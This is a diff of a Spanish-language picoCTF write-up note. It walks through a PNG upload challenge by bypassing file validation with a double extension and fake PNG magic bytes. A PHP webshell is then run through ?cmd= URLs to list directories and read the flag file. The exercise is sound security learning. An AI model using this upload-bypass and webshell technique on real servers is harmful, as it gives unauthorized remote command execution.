@@ -10,7 +10,8 @@ Primero ingresamos a [[robots.txt]] con la esperanza de encontrar algo que nos p
 User-agent: *
 Disallow: /instructions.txt
 Disallow: /uploads/  
-  
+
+Al encontrar que hay un lugar donde se puede ver como funciona el programa, lo inspeccionamos.
 [http://atlas.picoctf.net:51596/instructions.txt](http://atlas.picoctf.net:51596/instructions.txt):  
   
 Let's create a web app for PNG Images processing.
@@ -20,21 +21,21 @@ Allow users to upload PNG images
 	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
 after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
   
-[[webshell en Php]] -> lo utilizamos para ejecutar algo del lado del servidor (nos apoyamos de [[nano]] para crear el archivo [[PHP|.php]])
+Utilizamos [[webshell en Php]] -> lo utilizamos para ejecutar algo del lado del servidor (nos apoyamos de [[nano]] para crear el archivo [[PHP|.php]])
   
 ```bash
 ┌──(kali㉿kali)-[~]  
 └─$ nano webshell.php  
 ```
   
-No podemos subir archivos que no sean .png  
+No podemos subir archivos que no sean .png , por lo que intentamos un [[Double Extension Attack]].
   
 ```bash
 ┌──(kali㉿kali)-[~]  
 └─$ cp webshell.php webshell.php.png  
 ```
 
-Al intentar subirlo los magic bytes no coinciden  
+Al intentar subirlo los [[magic bytes]] no coinciden  
 ```
 Error: The file is not a valid PNG image: 3c3f7068  
 ```
@@ -43,7 +44,8 @@ Error: The file is not a valid PNG image: 3c3f7068
 ┌──(kali㉿kali)-[~]  
 └─$ nano webshell.php.png  
 ```
-  
+
+Usamos un truco para que los [[Magic Bytes]] coincidan.
 ```php
 PNG  
 <?php  
@@ -69,27 +71,31 @@ Verificamos que coincidan los bits magicos
   
 [http://atlas.picoctf.net:51596/uploads/webshell.php.png?cmd=ls](http://atlas.picoctf.net:51596/uploads/webshell.php.png?cmd=ls)  
 
-Pero no funciona  
+Con esto nos vamos a la carpeta de uploads, que habíamos descubierto anteriormente.
+
+Pero no funciona, esto es porque primero debe de ir la extensión png y luego la php.
   
 ```bash
 ┌──(kali㉿kali)-[~]  
 └─$ mv webshell.php.png webshell.png.php  
 ```
-  
+
 [http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls)  
 ```
 PNG
 webshell.php.png
 webshell.png.php
 ```
-  
+
+Buscamos para ver donde nos encontramos
 [http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=pwd](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=pwd)  
 ```
 PNG
 /var/www/html/uploads
 ```
-  
-[http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls) ..  
+
+Usamos [[Directory Transversal]] para acceder a ver que encontramos
+[http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls ..](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=ls)   
 ```
 PNG
 GQ4DOOBVMMYGK.txt
@@ -98,7 +104,8 @@ instructions.txt
 robots.txt
 uploads
 ```
-  
+
+Al ver un archivo con nombre raro, lo inspeccionamos.
 [http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=cat%20../GQ4DOOBVMMYGK.txt](http://atlas.picoctf.net:51596/uploads/webshell.png.php?cmd=cat%20../GQ4DOOBVMMYGK.txt)  
 ```
 PNG
